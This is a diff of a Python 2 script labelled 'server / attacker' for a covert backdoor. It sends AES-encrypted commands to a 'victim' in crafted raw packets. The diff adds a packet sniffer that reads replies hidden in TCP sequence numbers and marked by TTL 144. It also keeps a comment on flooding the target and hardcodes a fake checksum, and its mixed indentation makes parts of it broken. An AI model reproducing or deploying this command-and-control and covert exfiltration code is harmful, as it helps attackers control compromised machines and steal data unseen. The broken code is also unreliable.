@@ -1,10 +1,11 @@
 #server / attacker
 import ConfigParser, threading, hashlib, sys, os, socket
+import pcapy #sudo apt-get install python-pcapy
 
 
 #from Crypto import Random
 from Crypto.Cipher import AES
-from struct import pack
+from struct import pack, unpack
 
 configParser = ConfigParser.RawConfigParser()
 configFilePath = r'config.txt'
@@ -114,14 +115,17 @@ def getCmd():
 			print "Encrypted command: "+ encryptedCmd
 			print "Decypted command with wrong password: "+badDecrypt(encryptedCmd)
 			print "Decrypted command with correct password: "+decrypt(encryptedCmd)
+
 			#encrypt the command
 			'''
 			password = encrypt("pass")
 			#convert password to binary
 			password = string_bin(password)
-			'''
-			#create a packet to send to the victim
-			sendCommand(protocol, encryptedCmd, 1000)
+            '''
+            #create a packet to send to the victim
+                sendCommand(protocol, encryptedCmd, 1000)
+                sniffer()
+
 
 
 
@@ -192,8 +196,8 @@ def sendCommand(protocol, data, password):
 
 		psh = pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length);
 		psh = psh + tcp_header + data;
-
-		tcp_check = checksum(psh)
+        #tcp_check = checksum(psh)
+		tcp_check = 10
 
 		# print tcp_checksum
 
@@ -202,7 +206,7 @@ def sendCommand(protocol, data, password):
 						  tcp_window) + pack('H', tcp_check) + pack('!H', tcp_urg_ptr)
 
 		# final full packet - syn packets dont have any data
-		packet = ip_header + tcp_header + data
+        packet = ip_header + tcp_header + data
 
 	if (protocol == "UDP"):
 		print "create UDP header"
@@ -211,17 +215,156 @@ def sendCommand(protocol, data, password):
 	s.sendto(packet, (dstIP, 0))  # put this in a loop if you want to flood the target
 
 
+def sniffer():
+    # list all devices
+    devices = pcapy.findalldevs()
+    print devices
+
+    # ask user to enter device name to sniff
+    print "Available devices are :"
+    for d in devices:
+        print d
+
+    '''
+    dev = raw_input("Enter device name to sniff : ")
+
+    print "Sniffing device " + dev
+    '''
+    '''
+    open device
+    # Arguments here are:
+    #   device
+    #   snaplen (maximum number of bytes to capture _per_packet_)
+    #   promiscious mode (1 for true)
+    #   timeout (in milliseconds)
+    '''
+    cap = pcapy.open_live("lo", 65536, 1, 0)
+
+    # start sniffing packets
+    while (1):
+        (header, packet) = cap.next()
+        # print ('%s: captured %d bytes, truncated to %d bytes' %(datetime.datetime.now(), header.getlen(), header.getcaplen()))
+        command = parse_packet(packet)
+        if(command == True):
+            break
+
+# function to parse a packet
+def parse_packet(packet):
+    # parse ethernet header
+    eth_length = 14
+
+    eth_header = packet[:eth_length]
+    eth = unpack('!6s6sH', eth_header)
+    eth_protocol = socket.ntohs(eth[2])
+    '''
+    print 'Destination MAC : ' + eth_addr(packet[0:6]) + ' Source MAC : ' + eth_addr(
+        packet[6:12]) + ' Protocol : ' + str(eth_protocol)
+    '''
+
+    # Parse IP packets, IP Protocol number = 8
+    if eth_protocol == 8:
+        # Parse IP header
+        # take first 20 characters for the ip header
+        ip_header = packet[eth_length:20 + eth_length]
+
+        # now unpack them :)
+        iph = unpack('!BBHHHBBH4s4s', ip_header)
+
+        version_ihl = iph[0]
+        version = version_ihl >> 4
+        ihl = version_ihl & 0xF
+
+        iph_length = ihl * 4
+
+        ttl = iph[5]
+
+        # check if ttl is 144
+        if (ttl == 144):
+            protocol = iph[6]
+            s_addr = socket.inet_ntoa(iph[8]);
+            d_addr = socket.inet_ntoa(iph[9]);
+            '''
+            print 'Version : ' + str(version) + ' IP Header Length : ' + str(ihl) + ' TTL : ' + str(
+                ttl) + ' Protocol : ' + str(protocol) + ' Source Address : ' + str(
+                s_addr) + ' Destination Address : ' + str(d_addr)
+            '''
+            # TCP protocol
+            if protocol == 6:
+                t = iph_length + eth_length
+                tcp_header = packet[t:t + 20]
+
+                # now unpack them :)
+                tcph = unpack('!HHLLBBHHH', tcp_header)
+
+                # check if payload is our password
+                # get password from the packet
+                doff_reserved = tcph[4]
+                tcph_length = doff_reserved >> 4
+                h_size = eth_length + iph_length + tcph_length * 4
+                data_size = len(packet) - h_size
+                password = packet[h_size:]
+
+                #if(password == 1000):
+                source_port = tcph[0]
+                dest_port = tcph[1]
+                sequence = tcph[2]
+                acknowledgement = tcph[3]
+                '''
+                print 'Source Port : ' + str(source_port) + ' Dest Port : ' + str(
+                    dest_port) + ' Sequence Number : ' + str(
+                    sequence) + ' Acknowledgement : ' + str(acknowledgement) + ' TCP header length : ' + str(
+                    tcph_length)
+                '''
+
+                result = chr(sequence)
+                #result = decrypt(sequence)
+
+
+                #print 'Data : ' + result
+                print result,
+                if (iph[3] == 2):
+                    return True
+
+            # UDP packets
+            elif protocol == 17:
+                u = iph_length + eth_length
+                udph_length = 8
+                udp_header = packet[u:u + 8]
+
+                # now unpack them :)
+                udph = unpack('!HHHH', udp_header)
+
+                source_port = udph[0]
+                dest_port = udph[1]
+                length = udph[2]
+                checksum = udph[3]
+
+                print 'Source Port : ' + str(source_port) + ' Dest Port : ' + str(dest_port) + ' Length : ' + str(
+                    length) + ' Checksum : ' + str(checksum)
+
+                h_size = eth_length + iph_length + udph_length
+                data_size = len(packet) - h_size
+
+                # get data from the packet
+                data = packet[h_size:]
+
+                print 'Data : ' + decrypt(data)
+
 
 
 #2 main threads. User commands & file extraction
 def main():
-	checkRoot()
+    checkRoot()
 
-	cmdThread = threading.Thread(target=getCmd)
-	#fileThread = threading.Thread(target=getFile, args=(dstIP, srcIP, dstPort))
+
+    cmdThread = threading.Thread(target=getCmd)
+    #fileThread = threading.Thread(target=getFile, args=(dstIP, srcIP, dstPort))
 	
-	cmdThread.start()
+    cmdThread.start()
 	#fileThread.start()
 
 if __name__== '__main__':
-	main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print "exiting.."
